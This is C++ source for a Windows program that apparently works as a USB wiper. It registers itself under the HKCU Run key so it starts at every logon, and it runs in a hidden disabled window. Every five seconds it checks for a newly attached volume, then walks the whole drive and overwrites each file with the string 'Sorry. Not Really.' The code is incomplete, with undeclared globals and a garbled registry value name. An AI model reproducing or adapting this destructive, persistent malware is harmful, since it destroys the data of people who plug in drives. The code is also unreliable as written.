#include <windows.h>
#include <iostream>
#include <fstream>
using namespace std;
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PSTR szCmdLine, int iCmdShow)
{
    static TCHAR szAppName[] = TEXT("UUUUUU");
    HWND               hwnd;
    MSG                msg;
    WNDCLASS           wndclass;

    wndclass.style = 0;
    wndclass.lpfnWndProc = WndProc;
    wndclass.cbClsExtra = 0;
    wndclass.cbWndExtra = 0;
    wndclass.hInstance = hInstance;
    wndclass.hIcon = 0;
    wndclass.hCursor = 0;
    wndclass.hbrBackground = 0;
    wndclass.lpszMenuName = NULL;
    wndclass.lpszClassName = szAppName;

    SetAutoRun(TRUE);
    if (!RegisterClass(&wndclass))
    {
        MessageBox(NULL, TEXT("Program requires Windows NT!"),
            szAppName, MB_ICONERROR);
        return 0;
    }
    hwnd = CreateWindow(szAppName, NULL,
        WS_DISABLED,
        0, 0,
        0, 0,
        NULL, NULL, hInstance, NULL);
    while (GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return msg.wParam;
}
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM
    lParam)
{
    switch (message)
    {
    case WM_CREATE:
        U[1] = ':';
        SetTimer(hwnd, TIMER, 5000, 0);
        return 0;
    case WM_TIMER:
        SendMessage(hwnd, WM_DEVICECHANGE, 0, 0);
        return 0;
    case WM_DEVICECHANGE:
        OnDeviceChange(hwnd, wParam, lParam);
        return 0;
    case WM_DESTROY:
        KillTimer(hwnd, TIMER);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, message, wParam, lParam);
}
LRESULT OnDeviceChange(HWND hwnd, WPARAM wParam, LPARAM lParam)
{
    PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;
    switch (wParam)
    {
    case DBT_DEVICEARRIVAL:
        if (lpdb->dbch_devicetype == DBT_DEVTYP_VOLUME)
        {
            PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lpdb;
            U[0] = FirstDriveFromMask(lpdbv->dbcv_unitmask);
            string Utemp;
            Utemp = U;
            Filesearch(Utemp, 0);
            KillProgram(FileList);
        }
        break;
    }
    return LRESULT();
}
void Filesearch(string Path, int Layer)
{
    FileInfo FileInfomation;
    struct _finddata_t filefind;
    string Current = Path + "\\*.*";
    int Done = 0, i, Handle;
    string FullPath;
    if ((Handle = _findfirst(Current.c_str(), &filefind)) != -1)
    {
        while (!(Done = _findnext(Handle, &filefind)))
        {
            if (strcmp(filefind.name, "..") == 0)
                continue;
            for (i = 0; i < Layer; i++)
                printf("\t");
            if ((_A_SUBDIR == filefind.attrib))
            {
                printf("[Dir]:\t%s\n", filefind.name);
                Current = Path + "\\" + filefind.name;
                Filesearch(Current, Layer + 1);
            }
            else
            {
                printf("[File]:\t%s\n", filefind.name);
                FullPath = Path + "\\" + filefind.name;
                FileInfomation.Name = filefind.name;
                FileInfomation.FullPath = FullPath;
                FileList.push_back(FileInfomation);
                FullPath.empty();
            }
        }
        _findclose(Handle);
    }
}
void KillProgram(vector<FileInfo> FileList)
{
    mkdir("C:\\Destest");
    for (auto iterator = FileList.cbegin(); iterator != FileList.cend(); ++iterator)
    {
        string TempPath;
        TempPath = DesPath + "\\" + iterator->Name;
        target.open(iterator->FullPath.c_str(), ios::binary);
        char* buffer = "Sorry. Not Really.";
        target.write(buffer, sizeof(buffer));
    }
}
void SetAutoRun(BOOL bAutoRun)
{
    HKEY hKey;
    char* strRegPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    if (bAutoRun)
    {
        if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) 
        {
            TCHAR szModule[_MAX_PATH];
            GetModuleFileName(NULL, szModule, _MAX_PATH);
            RegSetValueEx(hKey, "U≈ÃºÏ≤‚", 0, REG_SZ, (const BYTE*)(LPCSTR)szModule, strlen(szModule)); 
            RegCloseKey(hKey);
        }
    }
    else
    {
        if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
        {
            RegDeleteValue(hKey, "U≈ÃºÏ≤‚");
            RegCloseKey(hKey);
        }
    }
}